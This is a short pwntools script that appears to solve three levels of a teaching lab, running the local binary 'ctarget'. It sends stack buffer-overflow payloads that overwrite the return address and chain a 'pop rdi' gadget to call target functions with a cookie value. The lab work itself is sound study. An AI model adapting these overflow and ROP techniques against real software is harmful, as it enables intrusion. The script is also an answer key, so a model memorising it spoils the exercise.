from pwn import * 
import os
#context.log_level = 'debug'
#context.terminal = ['tmux', 'splitw', '-h']
context.binary = "./ctarget"
io = process(["./ctarget","-q"])
def level1():
    print("level1 ans!!!!!")
    io.sendline(b"A"*40+p64(0x4017c0))
def level2():
    print("level2 ans!!!!!")
    cookie=0x59b997fa
    touch2=0x4017ec
    pop_rdi = 0x40141b
    payload = b"A"*40 + p64(pop_rdi)+p64(cookie)+p64(touch2)
    io.sendline(payload)
def level3():
    print("level3 ans!!!!!")
    pop_rdi = 0x40141b
    cookie=b"59b997fa"
    touch3 = 0x4018fa
    payload = cookie + b'\x00'*32 + p64(pop_rdi)+p64(0x5561dc78)+p64(touch3)
    io.sendline(payload)
#gdb.attach(io)
level3()
io.interactive()